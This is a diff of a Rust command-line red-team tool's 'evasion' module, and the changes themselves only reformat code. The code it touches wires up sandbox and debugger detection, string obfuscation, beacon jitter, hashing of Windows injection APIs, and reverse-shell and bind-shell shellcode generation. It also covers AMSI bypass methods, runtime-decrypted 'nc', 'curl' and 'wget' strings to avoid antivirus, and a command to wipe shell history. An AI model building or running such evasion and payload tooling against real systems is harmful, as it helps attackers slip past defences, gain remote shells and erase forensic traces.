@@ -77,7 +77,10 @@ impl Command for EvasionSandboxCommand {
         vec![
             ("Check if in sandbox", "rb evasion sandbox check"),
             ("Get sandbox score", "rb evasion sandbox score"),
-            ("Delay 5 minutes if sandbox", "rb evasion sandbox delay 300000"),
+            (
+                "Delay 5 minutes if sandbox",
+                "rb evasion sandbox delay 300000",
+            ),
         ]
     }
 
@@ -178,7 +181,11 @@ fn execute_sandbox_score() -> Result<(), String> {
     Output::info("Score Breakdown:");
     println!(
         "    VM Files:           {} pts",
-        if sandbox::check_vm_files() { "+20" } else { "  0" }
+        if sandbox::check_vm_files() {
+            "+20"
+        } else {
+            "  0"
+        }
     );
     println!(
         "    Sandbox Processes:  {} pts",
@@ -214,7 +221,11 @@ fn execute_sandbox_score() -> Result<(), String> {
     );
     println!(
         "    Debugger Present:   {} pts",
-        if sandbox::check_debugger() { "+10" } else { "  0" }
+        if sandbox::check_debugger() {
+            "+10"
+        } else {
+            "  0"
+        }
     );
 
     Ok(())
@@ -305,12 +316,18 @@ impl Command for EvasionObfuscateCommand {
 
     fn examples(&self) -> Vec<(&str, &str)> {
         vec![
-            ("XOR obfuscate", "rb evasion obfuscate xor \"secret command\""),
+            (
+                "XOR obfuscate",
+                "rb evasion obfuscate xor \"secret command\"",
+            ),
             (
                 "XOR with custom key",
                 "rb evasion obfuscate xor \"secret\" --key 66 --hex",
             ),
-            ("Base64 encode", "rb evasion obfuscate base64 \"sensitive data\""),
+            (
+                "Base64 encode",
+                "rb evasion obfuscate base64 \"sensitive data\"",
+            ),
             ("ROT13 encode", "rb evasion obfuscate rot \"hello world\""),
             (
                 "Deobfuscate",
@@ -335,8 +352,11 @@ impl Command for EvasionObfuscateCommand {
 fn execute_obfuscate_xor(ctx: &CliContext) -> Result<(), String> {
     let data = ctx.target.as_ref().ok_or("Missing string to obfuscate")?;
 
-    let key: u8 = ctx.flags.get("key").and_then(|s| s.parse().ok()).unwrap_or_else(
-        || {
+    let key: u8 = ctx
+        .flags
+        .get("key")
+        .and_then(|s| s.parse().ok())
+        .unwrap_or_else(|| {
             // Auto-derive key from content
             let mut k: u8 = 0x5A;
             for b in data.bytes() {
@@ -347,8 +367,7 @@ fn execute_obfuscate_xor(ctx: &CliContext) -> Result<(), String> {
             } else {
                 k
             }
-        },
-    );
+        });
 
     let show_hex = ctx.flags.contains_key("hex");
 
@@ -421,7 +440,10 @@ fn execute_obfuscate_rot(ctx: &CliContext) -> Result<(), String> {
 }
 
 fn execute_deobfuscate(ctx: &CliContext) -> Result<(), String> {
-    let hex_data = ctx.target.as_ref().ok_or("Missing hex data to deobfuscate")?;
+    let hex_data = ctx
+        .target
+        .as_ref()
+        .ok_or("Missing hex data to deobfuscate")?;
     let key: u8 = ctx
         .flags
         .get("key")
@@ -500,7 +522,10 @@ impl Command for EvasionNetworkCommand {
 
     fn examples(&self) -> Vec<(&str, &str)> {
         vec![
-            ("Calculate jittered delay", "rb evasion network jitter 60000 --percent 30"),
+            (
+                "Calculate jittered delay",
+                "rb evasion network jitter 60000 --percent 30",
+            ),
             ("Show beacon timer", "rb evasion network timer 60000"),
             ("Show traffic shaper", "rb evasion network shape"),
         ]
@@ -808,8 +833,14 @@ impl Command for EvasionBuildCommand {
     fn examples(&self) -> Vec<(&str, &str)> {
         vec![
             ("Show build info", "rb evasion build info"),
-            ("Build-key obfuscate", "rb evasion build obfuscate \"secret\""),
-            ("Build-key deobfuscate", "rb evasion build deobfuscate a1b2c3"),
+            (
+                "Build-key obfuscate",
+                "rb evasion build obfuscate \"secret\"",
+            ),
+            (
+                "Build-key deobfuscate",
+                "rb evasion build deobfuscate a1b2c3",
+            ),
         ]
     }
 
@@ -873,7 +904,10 @@ fn execute_build_obfuscate(ctx: &CliContext) -> Result<(), String> {
     let obfuscated = mutations::obfuscate_string(data);
 
     Output::item("Original", data);
-    Output::item("Build XOR Key", &format!("0x{:02X}", mutations::get_xor_key()));
+    Output::item(
+        "Build XOR Key",
+        &format!("0x{:02X}", mutations::get_xor_key()),
+    );
 
     if show_hex {
         let hex: String = obfuscated.iter().map(|b| format!("{:02x}", b)).collect();
@@ -895,7 +929,10 @@ fn execute_build_obfuscate(ctx: &CliContext) -> Result<(), String> {
 }
 
 fn execute_build_deobfuscate(ctx: &CliContext) -> Result<(), String> {
-    let hex_data = ctx.target.as_ref().ok_or("Missing hex data to deobfuscate")?;
+    let hex_data = ctx
+        .target
+        .as_ref()
+        .ok_or("Missing hex data to deobfuscate")?;
 
     Output::header("Build-Key Deobfuscation");
     println!();
@@ -915,7 +952,10 @@ fn execute_build_deobfuscate(ctx: &CliContext) -> Result<(), String> {
     let deobfuscated = mutations::deobfuscate_string(&bytes);
 
     Output::item("Hex Input", hex_data);
-    Output::item("Build XOR Key", &format!("0x{:02X}", mutations::get_xor_key()));
+    Output::item(
+        "Build XOR Key",
+        &format!("0x{:02X}", mutations::get_xor_key()),
+    );
     Output::item("Deobfuscated", &deobfuscated);
 
     Ok(())
@@ -994,7 +1034,10 @@ impl Command for EvasionAntidebugCommand {
             ("Run all checks", "rb evasion antidebug check"),
             ("Quick check", "rb evasion antidebug quick"),
             ("Paranoid mode", "rb evasion antidebug paranoid"),
-            ("Custom sensitivity", "rb evasion antidebug check --sensitivity 80"),
+            (
+                "Custom sensitivity",
+                "rb evasion antidebug check --sensitivity 80",
+            ),
         ]
     }
 
@@ -1033,7 +1076,10 @@ fn execute_antidebug_check(ctx: &CliContext) -> Result<(), String> {
     if result.debugger_detected {
         Output::error(&format!("Debugger DETECTED (score: {}/100)", result.score));
     } else {
-        Output::success(&format!("No debugger detected (score: {}/100)", result.score));
+        Output::success(&format!(
+            "No debugger detected (score: {}/100)",
+            result.score
+        ));
     }
 
     println!();
@@ -1149,7 +1195,10 @@ impl Command for EvasionMemoryCommand {
 
     fn examples(&self) -> Vec<(&str, &str)> {
         vec![
-            ("Encrypt string", "rb evasion memory encrypt \"password123\""),
+            (
+                "Encrypt string",
+                "rb evasion memory encrypt \"password123\"",
+            ),
             ("Demo operations", "rb evasion memory demo"),
             ("Rotate key", "rb evasion memory rotate"),
         ]
@@ -1178,9 +1227,20 @@ fn execute_memory_encrypt(ctx: &CliContext) -> Result<(), String> {
 
     Output::item("Original", data);
     Output::item("Size", &format!("{} bytes", buf.len()));
-    Output::item("Integrity", if buf.verify_integrity() { "OK" } else { "CORRUPT" });
+    Output::item(
+        "Integrity",
+        if buf.verify_integrity() {
+            "OK"
+        } else {
+            "CORRUPT"
+        },
+    );
 
-    let encrypted_hex: String = buf.encrypted_data().iter().map(|b| format!("{:02x}", b)).collect();
+    let encrypted_hex: String = buf
+        .encrypted_data()
+        .iter()
+        .map(|b| format!("{:02x}", b))
+        .collect();
     Output::item("Encrypted (hex)", &encrypted_hex);
 
     // Demonstrate roundtrip
@@ -1213,7 +1273,10 @@ fn execute_memory_demo() -> Result<(), String> {
     let cred = memory::SecureCredential::new("admin", "super_secret_123");
     println!("    Username: {}", cred.username());
     println!("    Password: {}", cred.password());
-    println!("    Integrity: {}", if cred.verify() { "OK" } else { "CORRUPT" });
+    println!(
+        "    Integrity: {}",
+        if cred.verify() { "OK" } else { "CORRUPT" }
+    );
 
     println!();
 
@@ -1282,7 +1345,7 @@ fn execute_memory_vault() -> Result<(), String> {
         // Note: Display shows [REDACTED], we use as_str() to show it works
         println!("    API_KEY value: {}", api_key.as_str());
         println!("    Display trait: {}", api_key); // Shows [REDACTED]
-        println!("    Debug trait: {:?}", api_key);  // Shows VaultEntry([REDACTED N bytes])
+        println!("    Debug trait: {:?}", api_key); // Shows VaultEntry([REDACTED N bytes])
     }
     println!();
 
@@ -1296,12 +1359,18 @@ fn execute_memory_vault() -> Result<(), String> {
     println!("    Locking vault (re-encrypts with new key)...");
     vault.lock();
     println!("    Is locked: {}", vault.is_locked());
-    println!("    Access while locked: {:?}", vault.get("API_KEY").map(|_| "success").unwrap_or("denied"));
+    println!(
+        "    Access while locked: {:?}",
+        vault.get("API_KEY").map(|_| "success").unwrap_or("denied")
+    );
 
     println!("    Unlocking vault...");
     vault.unlock();
     println!("    Is locked: {}", vault.is_locked());
-    println!("    Access after unlock: {:?}", vault.get("API_KEY").map(|_| "success").unwrap_or("denied"));
+    println!(
+        "    Access after unlock: {:?}",
+        vault.get("API_KEY").map(|_| "success").unwrap_or("denied")
+    );
     println!();
 
     // Usage example
@@ -1376,8 +1445,14 @@ impl Command for EvasionApihashCommand {
     fn examples(&self) -> Vec<(&str, &str)> {
         vec![
             ("Hash function name", "rb evasion apihash hash LoadLibraryA"),
-            ("Use DJB2", "rb evasion apihash hash VirtualAlloc --algo djb2"),
-            ("List kernel32 hashes", "rb evasion apihash list --dll kernel32"),
+            (
+                "Use DJB2",
+                "rb evasion apihash hash VirtualAlloc --algo djb2",
+            ),
+            (
+                "List kernel32 hashes",
+                "rb evasion apihash list --dll kernel32",
+            ),
             ("List syscalls", "rb evasion apihash syscalls"),
         ]
     }
@@ -1435,41 +1510,75 @@ fn execute_apihash_list(ctx: &CliContext) -> Result<(), String> {
     // kernel32
     if dll_filter.is_none() || dll_filter.as_deref() == Some("kernel32") {
         Output::info("kernel32.dll:");
-        if let Some(h) = hashes.get_hash("LoadLibraryA") { println!("    LoadLibraryA:      0x{:08X}", h); }
-        if let Some(h) = hashes.get_hash("GetProcAddress") { println!("    GetProcAddress:    0x{:08X}", h); }
-        if let Some(h) = hashes.get_hash("VirtualAlloc") { println!("    VirtualAlloc:      0x{:08X}", h); }
-        if let Some(h) = hashes.get_hash("VirtualProtect") { println!("    VirtualProtect:    0x{:08X}", h); }
-        if let Some(h) = hashes.get_hash("VirtualFree") { println!("    VirtualFree:       0x{:08X}", h); }
-        if let Some(h) = hashes.get_hash("CreateThread") { println!("    CreateThread:      0x{:08X}", h); }
-        if let Some(h) = hashes.get_hash("WaitForSingleObject") { println!("    WaitForSingleObj:  0x{:08X}", h); }
-        if let Some(h) = hashes.get_hash("CloseHandle") { println!("    CloseHandle:       0x{:08X}", h); }
-        if let Some(h) = hashes.get_hash("GetModuleHandleA") { println!("    GetModuleHandleA:  0x{:08X}", h); }
+        if let Some(h) = hashes.get_hash("LoadLibraryA") {
+            println!("    LoadLibraryA:      0x{:08X}", h);
+        }
+        if let Some(h) = hashes.get_hash("GetProcAddress") {
+            println!("    GetProcAddress:    0x{:08X}", h);
+        }
+        if let Some(h) = hashes.get_hash("VirtualAlloc") {
+            println!("    VirtualAlloc:      0x{:08X}", h);
+        }
+        if let Some(h) = hashes.get_hash("VirtualProtect") {
+            println!("    VirtualProtect:    0x{:08X}", h);
+        }
+        if let Some(h) = hashes.get_hash("VirtualFree") {
+            println!("    VirtualFree:       0x{:08X}", h);
+        }
+        if let Some(h) = hashes.get_hash("CreateThread") {
+            println!("    CreateThread:      0x{:08X}", h);
+        }
+        if let Some(h) = hashes.get_hash("WaitForSingleObject") {
+            println!("    WaitForSingleObj:  0x{:08X}", h);
+        }
+        if let Some(h) = hashes.get_hash("CloseHandle") {
+            println!("    CloseHandle:       0x{:08X}", h);
+        }
+        if let Some(h) = hashes.get_hash("GetModuleHandleA") {
+            println!("    GetModuleHandleA:  0x{:08X}", h);
+        }
         println!();
     }
 
     // ntdll
     if dll_filter.is_none() || dll_filter.as_deref() == Some("ntdll") {
         Output::info("ntdll.dll:");
-        if let Some(h) = hashes.get_hash("NtAllocateVirtualMemory") { println!("    NtAllocateVirtualMemory:  0x{:08X}", h); }
-        if let Some(h) = hashes.get_hash("NtProtectVirtualMemory") { println!("    NtProtectVirtualMemory:   0x{:08X}", h); }
-        if let Some(h) = hashes.get_hash("NtCreateThreadEx") { println!("    NtCreateThreadEx:         0x{:08X}", h); }
-        if let Some(h) = hashes.get_hash("NtWriteVirtualMemory") { println!("    NtWriteVirtualMemory:     0x{:08X}", h); }
-        if let Some(h) = hashes.get_hash("RtlMoveMemory") { println!("    RtlMoveMemory:            0x{:08X}", h); }
+        if let Some(h) = hashes.get_hash("NtAllocateVirtualMemory") {
+            println!("    NtAllocateVirtualMemory:  0x{:08X}", h);
+        }
+        if let Some(h) = hashes.get_hash("NtProtectVirtualMemory") {
+            println!("    NtProtectVirtualMemory:   0x{:08X}", h);
+        }
+        if let Some(h) = hashes.get_hash("NtCreateThreadEx") {
+            println!("    NtCreateThreadEx:         0x{:08X}", h);
+        }
+        if let Some(h) = hashes.get_hash("NtWriteVirtualMemory") {
+            println!("    NtWriteVirtualMemory:     0x{:08X}", h);
+        }
+        if let Some(h) = hashes.get_hash("RtlMoveMemory") {
+            println!("    RtlMoveMemory:            0x{:08X}", h);
+        }
         println!();
     }
 
     // user32
     if dll_filter.is_none() || dll_filter.as_deref() == Some("user32") {
         Output::info("user32.dll:");
-        if let Some(h) = hashes.get_hash("MessageBoxA") { println!("    MessageBoxA:  0x{:08X}", h); }
+        if let Some(h) = hashes.get_hash("MessageBoxA") {
+            println!("    MessageBoxA:  0x{:08X}", h);
+        }
         println!();
     }
 
     // advapi32
     if dll_filter.is_none() || dll_filter.as_deref() == Some("advapi32") {
         Output::info("advapi32.dll:");
-        if let Some(h) = hashes.get_hash("OpenProcessToken") { println!("    OpenProcessToken:      0x{:08X}", h); }
-        if let Some(h) = hashes.get_hash("AdjustTokenPrivileges") { println!("    AdjustTokenPrivileges: 0x{:08X}", h); }
+        if let Some(h) = hashes.get_hash("OpenProcessToken") {
+            println!("    OpenProcessToken:      0x{:08X}", h);
+        }
+        if let Some(h) = hashes.get_hash("AdjustTokenPrivileges") {
+            println!("    AdjustTokenPrivileges: 0x{:08X}", h);
+        }
         println!();
     }
 
@@ -1573,11 +1682,26 @@ fn execute_controlflow_demo() -> Result<(), String> {
 
     // Demo opaque predicates
     Output::info("1. Opaque Predicates (always true/false, hard to analyze):");
-    println!("    always_true_math(42):   {}", control_flow::OpaquePredicates::always_true_math(42));
-    println!("    always_true_ptr():      {}", control_flow::OpaquePredicates::always_true_ptr());
-    println!("    always_true_float():    {}", control_flow::OpaquePredicates::always_true_float());
-    println!("    always_false_math(42):  {}", control_flow::OpaquePredicates::always_false_math(42));
-    println!("    always_false_const():   {}", control_flow::OpaquePredicates::always_false_const());
+    println!(
+        "    always_true_math(42):   {}",
+        control_flow::OpaquePredicates::always_true_math(42)
+    );
+    println!(
+        "    always_true_ptr():      {}",
+        control_flow::OpaquePredicates::always_true_ptr()
+    );
+    println!(
+        "    always_true_float():    {}",
+        control_flow::OpaquePredicates::always_true_float()
+    );
+    println!(
+        "    always_false_math(42):  {}",
+        control_flow::OpaquePredicates::always_false_math(42)
+    );
+    println!(
+        "    always_false_const():   {}",
+        control_flow::OpaquePredicates::always_false_const()
+    );
 
     println!();
 
@@ -1595,9 +1719,24 @@ fn execute_controlflow_demo() -> Result<(), String> {
     Output::info("3. Instruction Substitution:");
     let a = 10u32;
     let b = 5u32;
-    println!("    add_substitute({}, {}): {}", a, b, control_flow::InstructionSubstitution::add_substitute(a, b));
-    println!("    sub_substitute({}, {}): {}", a, b, control_flow::InstructionSubstitution::sub_substitute(a, b));
-    println!("    xor_substitute({}, {}): {}", a, b, control_flow::InstructionSubstitution::xor_substitute(a, b));
+    println!(
+        "    add_substitute({}, {}): {}",
+        a,
+        b,
+        control_flow::InstructionSubstitution::add_substitute(a, b)
+    );
+    println!(
+        "    sub_substitute({}, {}): {}",
+        a,
+        b,
+        control_flow::InstructionSubstitution::sub_substitute(a, b)
+    );
+    println!(
+        "    xor_substitute({}, {}): {}",
+        a,
+        b,
+        control_flow::InstructionSubstitution::xor_substitute(a, b)
+    );
 
     Ok(())
 }
@@ -1611,16 +1750,34 @@ fn execute_controlflow_predicates() -> Result<(), String> {
     println!();
 
     Output::info("Always True:");
-    println!("    always_true_math(seed):   {}", control_flow::OpaquePredicates::always_true_math(12345));
-    println!("    always_true_ptr():        {}", control_flow::OpaquePredicates::always_true_ptr());
-    println!("    always_true_time():       {}", control_flow::OpaquePredicates::always_true_time());
-    println!("    always_true_float():      {}", control_flow::OpaquePredicates::always_true_float());
+    println!(
+        "    always_true_math(seed):   {}",
+        control_flow::OpaquePredicates::always_true_math(12345)
+    );
+    println!(
+        "    always_true_ptr():        {}",
+        control_flow::OpaquePredicates::always_true_ptr()
+    );
+    println!(
+        "    always_true_time():       {}",
+        control_flow::OpaquePredicates::always_true_time()
+    );
+    println!(
+        "    always_true_float():      {}",
+        control_flow::OpaquePredicates::always_true_float()
+    );
 
     println!();
 
     Output::info("Always False:");
-    println!("    always_false_math(seed):  {}", control_flow::OpaquePredicates::always_false_math(12345));
-    println!("    always_false_const():     {}", control_flow::OpaquePredicates::always_false_const());
+    println!(
+        "    always_false_math(seed):  {}",
+        control_flow::OpaquePredicates::always_false_math(12345)
+    );
+    println!(
+        "    always_false_const():     {}",
+        control_flow::OpaquePredicates::always_false_const()
+    );
 
     println!();
     Output::info("Usage: Wrap real code in if(opaque_true(seed)) { ... }");
@@ -1646,23 +1803,63 @@ fn execute_controlflow_substitute(ctx: &CliContext) -> Result<(), String> {
 
     println!();
     Output::info("Addition alternatives:");
-    println!("    Normal:          {} + {} = {}", value, other, value.wrapping_add(other));
-    println!("    add_substitute:  {} + {} = {}", value, other, control_flow::InstructionSubstitution::add_substitute(value, other));
+    println!(
+        "    Normal:          {} + {} = {}",
+        value,
+        other,
+        value.wrapping_add(other)
+    );
+    println!(
+        "    add_substitute:  {} + {} = {}",
+        value,
+        other,
+        control_flow::InstructionSubstitution::add_substitute(value, other)
+    );
 
     println!();
     Output::info("Subtraction alternatives:");
-    println!("    Normal:          {} - {} = {}", value, other, value.wrapping_sub(other));
-    println!("    sub_substitute:  {} - {} = {}", value, other, control_flow::InstructionSubstitution::sub_substitute(value, other));
+    println!(
+        "    Normal:          {} - {} = {}",
+        value,
+        other,
+        value.wrapping_sub(other)
+    );
+    println!(
+        "    sub_substitute:  {} - {} = {}",
+        value,
+        other,
+        control_flow::InstructionSubstitution::sub_substitute(value, other)
+    );
 
     println!();
     Output::info("XOR alternatives:");
-    println!("    Normal:          {} ^ {} = {}", value, other, value ^ other);
-    println!("    xor_substitute:  {} ^ {} = {}", value, other, control_flow::InstructionSubstitution::xor_substitute(value, other));
+    println!(
+        "    Normal:          {} ^ {} = {}",
+        value,
+        other,
+        value ^ other
+    );
+    println!(
+        "    xor_substitute:  {} ^ {} = {}",
+        value,
+        other,
+        control_flow::InstructionSubstitution::xor_substitute(value, other)
+    );
 
     println!();
     Output::info("Multiplication alternative:");
-    println!("    Normal:          {} * {} = {}", value, other, value.wrapping_mul(other));
-    println!("    mul_substitute:  {} * {} = {}", value, other, control_flow::InstructionSubstitution::mul_substitute(value, other));
+    println!(
+        "    Normal:          {} * {} = {}",
+        value,
+        other,
+        value.wrapping_mul(other)
+    );
+    println!(
+        "    mul_substitute:  {} * {} = {}",
+        value,
+        other,
+        control_flow::InstructionSubstitution::mul_substitute(value, other)
+    );
 
     Ok(())
 }
@@ -1723,10 +1920,19 @@ impl Command for EvasionInjectCommand {
 
     fn examples(&self) -> Vec<(&str, &str)> {
         vec![
-            ("Generate execve shellcode", "rb evasion inject shellcode shell"),
-            ("Reverse shell", "rb evasion inject shellcode reverse --ip 10.0.0.1 --port 4444"),
+            (
+                "Generate execve shellcode",
+                "rb evasion inject shellcode shell",
+            ),
+            (
+                "Reverse shell",
+                "rb evasion inject shellcode reverse --ip 10.0.0.1 --port 4444",
+            ),
             ("Bind shell", "rb evasion inject shellcode bind --port 4444"),
-            ("Encode shellcode", "rb evasion inject encode 4831c050... --key 0x42"),
+            (
+                "Encode shellcode",
+                "rb evasion inject encode 4831c050... --key 0x42",
+            ),
             ("List processes", "rb evasion inject list"),
         ]
     }
@@ -1746,7 +1952,11 @@ impl Command for EvasionInjectCommand {
 fn execute_inject_shellcode(ctx: &CliContext) -> Result<(), String> {
     let shellcode_type = ctx.target.as_ref().map(|s| s.as_str()).unwrap_or("shell");
 
-    let ip_str = ctx.flags.get("ip").map(|s| s.as_str()).unwrap_or("127.0.0.1");
+    let ip_str = ctx
+        .flags
+        .get("ip")
+        .map(|s| s.as_str())
+        .unwrap_or("127.0.0.1");
     let port: u16 = ctx
         .flags
         .get("port")
@@ -1763,10 +1973,7 @@ fn execute_inject_shellcode(ctx: &CliContext) -> Result<(), String> {
         }
         "reverse" | "rev" => {
             // Parse IP address to [u8; 4]
-            let parts: Vec<u8> = ip_str
-                .split('.')
-                .filter_map(|s| s.parse().ok())
-                .collect();
+            let parts: Vec<u8> = ip_str.split('.').filter_map(|s| s.parse().ok()).collect();
             if parts.len() != 4 {
                 return Err(format!("Invalid IP address: {}", ip_str));
             }
@@ -1778,7 +1985,12 @@ fn execute_inject_shellcode(ctx: &CliContext) -> Result<(), String> {
             Output::info(&format!("Linux x64 Bind Shell on port {}", port));
             inject::Shellcode::linux_x64_bind_shell(port)
         }
-        _ => return Err(format!("Unknown shellcode type: {}. Use: shell, reverse, bind", shellcode_type)),
+        _ => {
+            return Err(format!(
+                "Unknown shellcode type: {}. Use: shell, reverse, bind",
+                shellcode_type
+            ))
+        }
     };
 
     println!();
@@ -1787,7 +1999,11 @@ fn execute_inject_shellcode(ctx: &CliContext) -> Result<(), String> {
 
     println!();
     Output::info("Hex:");
-    let hex: String = shellcode.bytes().iter().map(|b| format!("{:02x}", b)).collect();
+    let hex: String = shellcode
+        .bytes()
+        .iter()
+        .map(|b| format!("{:02x}", b))
+        .collect();
     // Print in chunks of 32 chars (16 bytes)
     for chunk in hex.as_bytes().chunks(64) {
         println!("    {}", std::str::from_utf8(chunk).unwrap_or(""));
@@ -1797,7 +2013,11 @@ fn execute_inject_shellcode(ctx: &CliContext) -> Result<(), String> {
     Output::info("C array:");
     println!("    unsigned char shellcode[] = {{");
     for chunk in shellcode.bytes().chunks(12) {
-        let line: String = chunk.iter().map(|b| format!("0x{:02x}", b)).collect::<Vec<_>>().join(", ");
+        let line: String = chunk
+            .iter()
+            .map(|b| format!("0x{:02x}", b))
+            .collect::<Vec<_>>()
+            .join(", ");
         println!("        {},", line);
     }
     println!("    }};");
@@ -1806,7 +2026,10 @@ fn execute_inject_shellcode(ctx: &CliContext) -> Result<(), String> {
 }
 
 fn execute_inject_encode(ctx: &CliContext) -> Result<(), String> {
-    let hex_data = ctx.target.as_ref().ok_or("Missing hex shellcode to encode")?;
+    let hex_data = ctx
+        .target
+        .as_ref()
+        .ok_or("Missing hex shellcode to encode")?;
 
     let key: u8 = ctx
         .flags
@@ -1826,7 +2049,12 @@ fn execute_inject_encode(ctx: &CliContext) -> Result<(), String> {
     // Parse hex
     let bytes: Result<Vec<u8>, _> = (0..hex_data.len())
         .step_by(2)
-        .map(|i| u8::from_str_radix(&hex_data[i..i.min(hex_data.len()) + 2.min(hex_data.len() - i)], 16))
+        .map(|i| {
+            u8::from_str_radix(
+                &hex_data[i..i.min(hex_data.len()) + 2.min(hex_data.len() - i)],
+                16,
+            )
+        })
         .collect();
 
     let bytes = bytes.map_err(|_| "Invalid hex string")?;
@@ -1841,7 +2069,11 @@ fn execute_inject_encode(ctx: &CliContext) -> Result<(), String> {
     Output::info("Encoded:");
     Output::item("Total size", &format!("{} bytes", shellcode.len()));
 
-    let hex: String = shellcode.bytes().iter().map(|b| format!("{:02x}", b)).collect();
+    let hex: String = shellcode
+        .bytes()
+        .iter()
+        .map(|b| format!("{:02x}", b))
+        .collect();
     for chunk in hex.as_bytes().chunks(64) {
         println!("    {}", std::str::from_utf8(chunk).unwrap_or(""));
     }
@@ -1878,7 +2110,10 @@ fn execute_inject_list(ctx: &CliContext) -> Result<(), String> {
         count += 1;
 
         if count >= 50 && filter.is_none() {
-            println!("    ... ({} more, use --filter to narrow)", processes.len() - 50);
+            println!(
+                "    ... ({} more, use --filter to narrow)",
+                processes.len() - 50
+            );
             break;
         }
     }
@@ -1931,22 +2166,31 @@ impl Command for EvasionAmsiCommand {
     }
 
     fn flags(&self) -> Vec<Flag> {
-        vec![Flag::new("method", "Bypass method (patch, initfailed, context)")
-            .with_short('m')
-            .with_default("patch")]
+        vec![
+            Flag::new("method", "Bypass method (patch, initfailed, context)")
+                .with_short('m')
+                .with_default("patch"),
+        ]
     }
 
     fn examples(&self) -> Vec<(&str, &str)> {
         vec![
             ("PowerShell bypass", "rb evasion amsi powershell"),
-            ("Init failed method", "rb evasion amsi powershell --method initfailed"),
+            (
+                "Init failed method",
+                "rb evasion amsi powershell --method initfailed",
+            ),
             ("C# bypass", "rb evasion amsi csharp"),
             ("Obfuscated bypass", "rb evasion amsi obfuscated"),
         ]
     }
 
     fn execute(&self, ctx: &CliContext) -> Result<(), String> {
-        let verb = ctx.verb.as_ref().map(|s| s.as_str()).unwrap_or("powershell");
+        let verb = ctx
+            .verb
+            .as_ref()
+            .map(|s| s.as_str())
+            .unwrap_or("powershell");
 
         match verb {
             "powershell" | "ps" => execute_amsi_powershell(ctx),
@@ -1959,7 +2203,11 @@ impl Command for EvasionAmsiCommand {
 }
 
 fn execute_amsi_powershell(ctx: &CliContext) -> Result<(), String> {
-    let method = ctx.flags.get("method").map(|s| s.as_str()).unwrap_or("patch");
+    let method = ctx
+        .flags
+        .get("method")
+        .map(|s| s.as_str())
+        .unwrap_or("patch");
 
     Output::header("PowerShell AMSI Bypass");
     println!();
@@ -1968,7 +2216,12 @@ fn execute_amsi_powershell(ctx: &CliContext) -> Result<(), String> {
         "patch" => amsi::AmsiBypassMethod::PatchAmsiScanBuffer,
         "initfailed" | "init" => amsi::AmsiBypassMethod::ForceInitFailed,
         "context" => amsi::AmsiBypassMethod::CorruptContext,
-        _ => return Err(format!("Unknown method: {}. Use: patch, initfailed, context", method)),
+        _ => {
+            return Err(format!(
+                "Unknown method: {}. Use: patch, initfailed, context",
+                method
+            ))
+        }
     };
 
     Output::item("Method", &format!("{:?}", bypass_method));
@@ -2116,7 +2369,11 @@ fn execute_strings_encrypt(ctx: &CliContext) -> Result<(), String> {
     Output::item("Original", data);
     Output::item("Key", &format!("0x{:02X}", key));
 
-    let hex: String = encrypted.encrypted_bytes().iter().map(|b| format!("{:02x}", b)).collect();
+    let hex: String = encrypted
+        .encrypted_bytes()
+        .iter()
+        .map(|b| format!("{:02x}", b))
+        .collect();
     Output::item("Encrypted (hex)", &hex);
 
     let recovered = encrypted.decrypt();
@@ -2124,8 +2381,15 @@ fn execute_strings_encrypt(ctx: &CliContext) -> Result<(), String> {
 
     println!();
     Output::info("Rust code to embed:");
-    println!("    const ENCRYPTED: &[u8] = &[{}];",
-        encrypted.encrypted_bytes().iter().map(|b| format!("0x{:02x}", b)).collect::<Vec<_>>().join(", "));
+    println!(
+        "    const ENCRYPTED: &[u8] = &[{}];",
+        encrypted
+            .encrypted_bytes()
+            .iter()
+            .map(|b| format!("0x{:02x}", b))
+            .collect::<Vec<_>>()
+            .join(", ")
+    );
     println!("    const KEY: u8 = 0x{:02X};", key);
     println!("    let s = EncryptedString::new(ENCRYPTED, KEY).decrypt();");
 
@@ -2139,13 +2403,34 @@ fn execute_strings_sensitive() -> Result<(), String> {
     Output::info("Common strings that would trigger AV if plaintext:");
     println!();
 
-    println!("    cmd_exe:         \"{}\"", strings::SensitiveStrings::cmd_exe().decrypt_with_build_key());
-    println!("    powershell:      \"{}\"", strings::SensitiveStrings::powershell().decrypt_with_build_key());
-    println!("    bash:            \"{}\"", strings::SensitiveStrings::bash().decrypt_with_build_key());
-    println!("    sh:              \"{}\"", strings::SensitiveStrings::sh().decrypt_with_build_key());
-    println!("    nc:              \"{}\"", strings::SensitiveStrings::nc().decrypt_with_build_key());
-    println!("    curl:            \"{}\"", strings::SensitiveStrings::curl().decrypt_with_build_key());
-    println!("    wget:            \"{}\"", strings::SensitiveStrings::wget().decrypt_with_build_key());
+    println!(
+        "    cmd_exe:         \"{}\"",
+        strings::SensitiveStrings::cmd_exe().decrypt_with_build_key()
+    );
+    println!(
+        "    powershell:      \"{}\"",
+        strings::SensitiveStrings::powershell().decrypt_with_build_key()
+    );
+    println!(
+        "    bash:            \"{}\"",
+        strings::SensitiveStrings::bash().decrypt_with_build_key()
+    );
+    println!(
+        "    sh:              \"{}\"",
+        strings::SensitiveStrings::sh().decrypt_with_build_key()
+    );
+    println!(
+        "    nc:              \"{}\"",
+        strings::SensitiveStrings::nc().decrypt_with_build_key()
+    );
+    println!(
+        "    curl:            \"{}\"",
+        strings::SensitiveStrings::curl().decrypt_with_build_key()
+    );
+    println!(
+        "    wget:            \"{}\"",
+        strings::SensitiveStrings::wget().decrypt_with_build_key()
+    );
 
     println!();
     Output::info("These strings are stored encrypted and only decrypted at runtime");
@@ -2246,7 +2531,10 @@ impl Command for EvasionTracksCommand {
             ("Scan for history files", "rb evasion tracks scan"),
             ("Clear all history", "rb evasion tracks clear"),
             ("Secure wipe history", "rb evasion tracks clear --secure"),
-            ("Clear only bash history", "rb evasion tracks clear --shell bash"),
+            (
+                "Clear only bash history",
+                "rb evasion tracks clear --shell bash",
+            ),
             ("Clear rb sessions", "rb evasion tracks sessions"),
             ("Get clear command", "rb evasion tracks command"),
         ]
@@ -2280,7 +2568,10 @@ fn execute_tracks_scan() -> Result<(), String> {
     let files = tracks::HistoryFiles::detect();
 
     if !files.bash.is_empty() {
-        println!("    {} Bash history files:", colored(&files.bash.len().to_string(), YELLOW));
+        println!(
+            "    {} Bash history files:",
+            colored(&files.bash.len().to_string(), YELLOW)
+        );
         for f in &files.bash {
             let size = std::fs::metadata(f).map(|m| m.len()).unwrap_or(0);
             println!("        {} ({} bytes)", f.display(), size);
@@ -2288,7 +2579,10 @@ fn execute_tracks_scan() -> Result<(), String> {
     }
 
     if !files.zsh.is_empty() {
-        println!("    {} Zsh history files:", colored(&files.zsh.len().to_string(), YELLOW));
+        println!(
+            "    {} Zsh history files:",
